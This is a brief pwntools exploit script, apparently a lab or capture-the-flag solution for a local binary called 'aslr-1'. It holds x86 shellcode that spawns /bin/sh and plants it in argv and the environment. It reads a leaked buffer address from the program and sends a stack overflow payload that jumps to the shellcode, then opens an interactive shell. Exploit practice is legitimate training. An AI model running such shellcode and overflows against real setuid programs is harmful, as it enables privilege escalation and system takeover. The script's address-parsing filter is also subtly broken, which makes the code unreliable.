#!/usr/bin/env python
from pwn import *

#SHELLCODE = 'SET YOUR SHELLCODE HERE'
SHELLCODE = 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'

# You may set your shellcode in ENVP...
ENV = { 'SHELLCODE' : SHELLCODE }

# You may set your shellcode in ARGV...
ARG1 = SHELLCODE

# set ARG and ENV
p = process(["./aslr-1",ARG1],env=ENV)

# read output to read address leaks
data = p.recvuntil('name:')
# parse them. Split by newline
arr = data.split('\n')
ar =  arr[0].split(':')[0].split(' ')
print(ar)

# get the address values and convert them into hex integers
ar = [int(a, 16) for a in ar if len(a) > 0 and not ('Your','buffer','is','at' in a)]
new_addr_buffer = int(a, 16)
print (hex(new_addr_buffer))

buffer = SHELLCODE + "A"*(0x88+4 - len(SHELLCODE)) + p32(new_addr_buffer)

p.send(buffer)

p.interactive()
